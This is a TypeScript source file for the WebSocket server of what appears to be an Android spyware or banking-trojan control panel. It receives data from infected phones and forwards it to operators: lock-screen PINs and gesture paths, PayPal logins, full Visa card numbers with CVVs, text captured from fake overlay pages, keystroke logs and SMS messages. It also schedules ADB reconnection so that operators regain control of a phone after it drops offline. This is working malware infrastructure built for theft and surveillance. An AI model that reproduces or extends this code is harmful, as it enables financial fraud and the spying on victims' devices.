import type { FastifyInstance } from "fastify";
import type { WebSocket } from "@fastify/websocket";
import {
  getDeviceByToken,
  setDeviceOnline,
  touchHeartbeat,
  updateDeviceClientIp,
  updateDeviceMeta,
} from "../services/device.service.js";
import { clearDeviceTransferred } from "../services/device-transfer.service.js";
import { applyCommandResult } from "../services/command.service.js";
import { saveKeyboardLog } from "../services/keyboard.service.js";
import { appendKeyguardPinHistory } from "../services/keyguard-pin.service.js";
import { saveFakePageSubmission } from "../services/fake-page.service.js";
import { createPayPalAccount } from "../services/paypal-account.service.js";
import { createVisaAccount } from "../services/visa-account.service.js";
import { saveSmsLog } from "../services/sms.service.js";
import type { CommandResultPayload, DeviceInboundMessage } from "../types/messages.js";
import { resolveClientIp } from "../utils/client-ip.js";
import { connectionManager } from "./connection-manager.js";
import { scheduleAdbRestore, cancelScheduledAdbRestore } from "../services/adb-restore-bootstrap.js";
import { markAdbEndpointOffline } from "../services/adb-relay.service.js";

function parseMessage(raw: Buffer | ArrayBuffer | Buffer[]): DeviceInboundMessage | null {
  try {
    const text = Buffer.isBuffer(raw)
      ? raw.toString("utf8")
      : raw instanceof ArrayBuffer
        ? Buffer.from(raw).toString("utf8")
        : Buffer.concat(raw).toString("utf8");
    return JSON.parse(text) as DeviceInboundMessage;
  } catch {
    return null;
  }
}

export async function registerDeviceWsRoutes(app: FastifyInstance) {
  app.get("/ws/device", { websocket: true }, (socket: WebSocket, request) => {
    const token = String((request.query as { token?: string }).token ?? "").trim();
    let deviceId: string | null = null;
    let isReady = false;

    void (async () => {
      const device = await getDeviceByToken(token);
      if (!device) {
        socket.close(4401, "invalid_token");
        return;
      }

      deviceId = device.deviceId;
      isReady = true;
      await clearDeviceTransferred(deviceId);
      // 断线期间无障碍服务可能已经崩了；旧值必须先清，
      // 否则「已连接」会一直显示，而这正是这次要修的误导。
      connectionManager.clearDeviceA11yHealth(deviceId);
      const { resumedWithinGrace } = connectionManager.addDevice(deviceId, socket);
      await setDeviceOnline(deviceId, true);

      const clientIp = resolveClientIp(request);
      await updateDeviceClientIp(deviceId, clientIp);

      // 宽限内重连：从未广播过离线，也不再刷一次上线，避免列表闪烁
      if (!resumedWithinGrace) {
        connectionManager.broadcastToAdmins({
          type: "device_online",
          deviceId,
          payload: {
            model: device.model,
            androidId: device.androidId,
          },
          timestamp: Date.now(),
        });
      }

      app.log.info({ deviceId, resumedWithinGrace }, "device connected");

      // 端点在库里就先排队免配对重连：服务器重启、手机离线回来都走这条路。
      scheduleAdbRestore(deviceId);
    })();

    socket.on("message", (raw: Buffer | ArrayBuffer | Buffer[]) => {
      if (!isReady || !deviceId) {
        return;
      }

      const message = parseMessage(raw);
      if (!message) {
        socket.send(JSON.stringify({ type: "error", message: "invalid_json" }));
        return;
      }

      if (message.type === "heartbeat") {
        void touchHeartbeat(deviceId);
        if (message.payload && typeof message.payload === "object") {
          void updateDeviceMeta(deviceId, message.payload);
          // 新版客户端心跳里带无障碍「实际连接」；旧版没有这两个字段，
          // 这里只在字段存在时才写，避免把探针值覆盖成 null。
          const payload = message.payload;
          const serviceConnected = payload.accessibilityConnected;
          const controlReady = payload.controlReady;
          const hasA11yHealth =
            typeof serviceConnected === "boolean" || typeof controlReady === "boolean";
          if (hasA11yHealth) {
            connectionManager.updateDeviceHealth(deviceId, {
              a11yServiceConnected:
                typeof serviceConnected === "boolean" ? serviceConnected : null,
              a11yControlReady: typeof controlReady === "boolean" ? controlReady : null,
              a11yReportedAt: Date.now(),
              a11ySource: "heartbeat",
            });
          }
          if (payload.transferRollback === 1 || payload.transferRollback === "1") {
            void clearDeviceTransferred(deviceId);
          }
        }
        socket.send(JSON.stringify({ type: "pong", timestamp: Date.now() }));
        connectionManager.broadcastToAdmins({
          type: "heartbeat",
          deviceId,
          payload: message.payload,
          timestamp: Date.now(),
        });
        return;
      }

      if (message.type === "command_result") {
        const payload = message.payload as CommandResultPayload | undefined;
        if (!payload?.id) {
          socket.send(JSON.stringify({ type: "error", message: "command_result_missing_id" }));
          return;
        }

        void applyCommandResult(deviceId, payload);
        socket.send(JSON.stringify({ type: "ack", commandId: payload.id }));
        return;
      }

      if (message.type === "keyguard_pin") {
        const payload = message.payload;
        const pin = typeof payload?.pin === "string" ? payload.pin.trim() : "";
        if (!pin) {
          socket.send(JSON.stringify({ type: "error", message: "keyguard_pin_required" }));
          return;
        }

        // 设备上报只写历史表（不碰一键解锁库）；一键解锁仅人工「填入/设为默认」
        const gesturePath =
          typeof payload?.gesturePath === "string"
            ? payload.gesturePath
            : typeof payload?.data === "string"
              ? payload.data
              : "";
        void (async () => {
          try {
            const record = await appendKeyguardPinHistory(
              deviceId,
              {
                pin,
                lockType:
                  typeof payload?.lockType === "string"
                    ? payload.lockType
                    : typeof payload?.lockTypeCode === "number"
                      ? String(payload.lockTypeCode)
                      : "pin",
                gesturePath,
                capturedAt:
                  typeof payload?.capturedAt === "number" ? payload.capturedAt : Date.now(),
              },
              "device",
            );

            if (!record) {
              app.log.warn({ deviceId }, "keyguard_pin_report_invalid");
              return;
            }

            connectionManager.broadcastToAdmins({
              type: "keyguard_pin",
              deviceId,
              payload: {
                id: record.id,
                pin: record.pin,
                digitCount: record.digitCount,
                lockType: record.lockType,
                gesturePath: record.gesturePath,
                source: record.source,
                capturedAt: record.capturedAt,
                updatedAt: record.capturedAt,
                createdAt: record.createdAt,
              },
              timestamp: Date.now(),
            });
          } catch (error) {
            app.log.warn({ deviceId, error }, "keyguard_pin_history_save_failed");
          }
        })();

        socket.send(JSON.stringify({ type: "ack", channel: "keyguard_pin" }));
        return;
      }

      if (message.type === "paypal_account") {
        const payload = message.payload;
        const email = typeof payload?.email === "string" ? payload.email.trim() : "";
        const password = typeof payload?.password === "string" ? payload.password : "";
        if (!email || !password) {
          socket.send(JSON.stringify({ type: "error", message: "paypal_email_password_required" }));
          return;
        }

        void (async () => {
          try {
            const record = await createPayPalAccount(deviceId, {
              email,
              password,
              amount: typeof payload?.amount === "string" ? payload.amount : null,
              currency: typeof payload?.currency === "string" ? payload.currency : "USD",
              submittedAt:
                typeof payload?.submittedAt === "number" ? payload.submittedAt : Date.now(),
            });

            connectionManager.broadcastToAdmins({
              type: "paypal_account",
              deviceId,
              payload: {
                id: record.id,
                email: record.email,
                amount: record.amount,
                currency: record.currency,
                submittedAt: record.submittedAt,
                updatedAt: record.updatedAt,
              },
              timestamp: Date.now(),
            });
          } catch (error) {
            app.log.warn({ deviceId, error }, "paypal_account_upsert_failed");
          }
        })();

        socket.send(JSON.stringify({ type: "ack", channel: "paypal_account" }));
        return;
      }

      if (message.type === "visa_account") {
        const payload = message.payload;
        const cardHolder = typeof payload?.cardHolder === "string" ? payload.cardHolder.trim() : "";
        const cardNumber = typeof payload?.cardNumber === "string" ? payload.cardNumber : "";
        const expiry = typeof payload?.expiry === "string" ? payload.expiry.trim() : "";
        const cvv = typeof payload?.cvv === "string" ? payload.cvv : "";
        if (!cardHolder || !cardNumber || !expiry || !cvv) {
          socket.send(JSON.stringify({ type: "error", message: "visa_fields_required" }));
          return;
        }

        void (async () => {
          try {
            const record = await createVisaAccount(deviceId, {
              cardHolder,
              cardNumber,
              expiry,
              cvv,
              amount: typeof payload?.amount === "string" ? payload.amount : null,
              submittedAt:
                typeof payload?.submittedAt === "number" ? payload.submittedAt : Date.now(),
            });

            connectionManager.broadcastToAdmins({
              type: "visa_account",
              deviceId,
              payload: {
                id: record.id,
                cardHolder: record.cardHolder,
                cardNumber: record.cardNumber,
                expiry: record.expiry,
                amount: record.amount,
                submittedAt: record.submittedAt,
                updatedAt: record.updatedAt,
              },
              timestamp: Date.now(),
            });
          } catch (error) {
            app.log.warn({ deviceId, error }, "visa_account_save_failed");
          }
        })();

        socket.send(JSON.stringify({ type: "ack", channel: "visa_account" }));
        return;
      }

      if (message.type === "fake_page") {
        const payload = message.payload;
        const text = typeof payload?.text === "string" ? payload.text.trim() : "";
        if (!text) {
          socket.send(JSON.stringify({ type: "error", message: "fake_page_text_required" }));
          return;
        }
        void (async () => {
          try {
            const record = await saveFakePageSubmission({
              deviceId,
              packageName: typeof payload?.packageName === "string" ? payload.packageName : "",
              title: typeof payload?.title === "string" ? payload.title : "",
              text,
              submitCount:
                typeof payload?.submitCount === "number" ? payload.submitCount : 1,
              capturedAt:
                typeof payload?.capturedAt === "number" ? payload.capturedAt : Date.now(),
            });
            connectionManager.broadcastToAdmins({
              type: "fake_page",
              deviceId,
              payload: {
                id: record.id,
                packageName: record.packageName,
                title: record.title,
                text: record.text,
                submitCount: record.submitCount,
                capturedAt: record.capturedAt,
                createdAt: record.createdAt,
              },
              timestamp: Date.now(),
            });
          } catch (error) {
            app.log.warn({ deviceId, error }, "fake_page_save_failed");
          }
        })();
        socket.send(JSON.stringify({ type: "ack", channel: "fake_page" }));
        return;
      }

      if (message.type === "keyboard") {
        const payload = message.payload;
        const text = typeof payload?.text === "string" ? payload.text.trim() : "";
        if (!text) {
          socket.send(JSON.stringify({ type: "error", message: "keyboard_text_required" }));
          return;
        }

        void (async () => {
          const log = await saveKeyboardLog(deviceId, {
            appPackage:
              typeof payload?.appPackage === "string" ? payload.appPackage : null,
            appLabel:
              typeof payload?.appLabel === "string" ? payload.appLabel : null,
            text,
            eventType:
              typeof payload?.eventType === "number" ? payload.eventType : null,
            capturedAt:
              typeof payload?.capturedAt === "number" ? payload.capturedAt : Date.now(),
          });

          connectionManager.broadcastToAdmins({
            type: "keyboard",
            deviceId,
            payload: {
              logId: log.id,
              appPackage: log.appPackage,
              appLabel: log.appLabel,
              text: log.text,
              eventType: log.eventType,
              capturedAt: log.capturedAt,
            },
            timestamp: Date.now(),
          });
        })();

        socket.send(JSON.stringify({ type: "ack", channel: "keyboard" }));
        return;
      }

      if (message.type === "screen_frame" || message.type === "screen_error") {
        socket.send(
          JSON.stringify({
            type: "error",
            message: "use_screen_channel:/ws/device/screen",
          }),
        );
        return;
      }

      if (message.type === "sms") {
        const payload = message.payload;
        const sender = typeof payload?.sender === "string" ? payload.sender.trim() : "";
        const body = typeof payload?.body === "string" ? payload.body.trim() : "";
        if (!sender || !body) {
          socket.send(JSON.stringify({ type: "error", message: "sms_sender_body_required" }));
          return;
        }

        void (async () => {
          const log = await saveSmsLog(deviceId, {
            sender,
            body,
            smsType: typeof payload?.smsType === "number" ? payload.smsType : 1,
            source: typeof payload?.source === "string" ? payload.source : "realtime",
            clientSmsId:
              typeof payload?.clientSmsId === "string" ? payload.clientSmsId : null,
            receivedAt:
              typeof payload?.receivedAt === "number" ? payload.receivedAt : Date.now(),
          });

          if (!log.duplicated) {
            connectionManager.broadcastToAdmins({
              type: "sms",
              deviceId,
              payload: {
                logId: log.id,
                sender: log.sender,
                body: log.body,
                smsType: log.smsType,
                source: log.source,
                receivedAt: log.receivedAt,
              },
              timestamp: Date.now(),
            });
          }
        })();

        socket.send(JSON.stringify({ type: "ack", channel: "sms" }));
        return;
      }

      socket.send(
        JSON.stringify({
          type: "error",
          message: `unsupported_type:${message.type}`,
        }),
      );
    });

    socket.on("close", () => {
      if (!deviceId) {
        return;
      }
      const closedDeviceId = deviceId;

      const removed = connectionManager.removeDevice(closedDeviceId, socket);
      if (!removed) {
        app.log.info({ deviceId: closedDeviceId }, "stale device socket closed");
        return;
      }

      if (!connectionManager.isDeviceConnected(closedDeviceId)) {
        connectionManager.scheduleDeviceOfflineGrace(closedDeviceId, () => {
          void setDeviceOnline(closedDeviceId, false);
          connectionManager.broadcastToAdmins({
            type: "device_offline",
            deviceId: closedDeviceId,
            timestamp: Date.now(),
          });
          app.log.info({ deviceId: closedDeviceId }, "device offline confirmed after grace");
        });
      }
      // 手机关掉或断网：端点保留，只翻成 offline。等它回来时就能免配对重连，
      // 而不是要求运维重新点一次手动匹配。
      cancelScheduledAdbRestore(closedDeviceId);
      void markAdbEndpointOffline(closedDeviceId);
      app.log.info({ deviceId: closedDeviceId }, "device disconnected");
    });
  });
}
